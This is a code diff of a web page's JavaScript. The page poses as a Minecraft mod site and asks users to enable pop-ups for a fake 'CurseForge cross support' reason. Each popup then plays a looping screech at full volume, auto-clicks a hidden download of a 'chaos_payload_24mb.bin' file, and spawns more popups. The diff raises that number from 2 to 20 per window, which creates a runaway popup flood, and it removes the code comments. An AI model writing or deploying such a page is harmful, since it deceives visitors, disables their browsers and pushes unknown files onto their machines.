@@ -8,8 +8,8 @@
       const width = 500;
       const height = 400;
 
-      const left = window.screen.availWidth - width - 10; // 10 px from right edge
-      const top = 10; // 10 px from top edge
+      const left = window.screen.availWidth - width - 10;
+      const top = 10;
 
       const popup = window.open(
         window.location.href + "?popup=true",
@@ -27,7 +27,6 @@
       const isPopup = new URLSearchParams(window.location.search).has('popup');
 
       if (isPopup) {
-        // === POPUP CONTENT ===
         document.body.innerHTML = `
           <audio id="screech" autoplay loop>
             <source src="screech.mp3" type="audio/mpeg">
@@ -37,7 +36,6 @@
           <a id="downloadLink" href="https://elitemetal7.github.io/CoolestMinecraftMods/chaos_payload_24mb.bin" download style="display:none"></a>
         `;
 
-        // Play the screech
         const screech = document.getElementById('screech');
         screech.volume = 1.0;
         screech.play().catch(() => {
@@ -46,28 +44,24 @@
           }, { once: true });
         });
 
-        // Trigger file download on user click (fallback)
         const download = document.getElementById('downloadLink');
         download.click();
 
-        // Immediately open 2 more popups at top-right
-        openPopup();
-        openPopup();
+        // Spawn 20 popups immediately
+        for (let i = 0; i < 20; i++) {
+          openPopup();
+        }
 
-        // Auto-close after 4 seconds
         setTimeout(() => {
           window.close();
         }, 4000);
 
       } else {
-        // === MAIN PAGE CONTENT ===
         document.body.innerHTML = `
           <h1>This wesbite requires pop-ups</h1>
           <p>Due to using CurseForge cross support, please enable pop-ups to contenue.</p>
           <p>Thank you for your understanding.</p>
         `;
-
-        // Open initial popup at top-right
         openPopup();
       }
     };
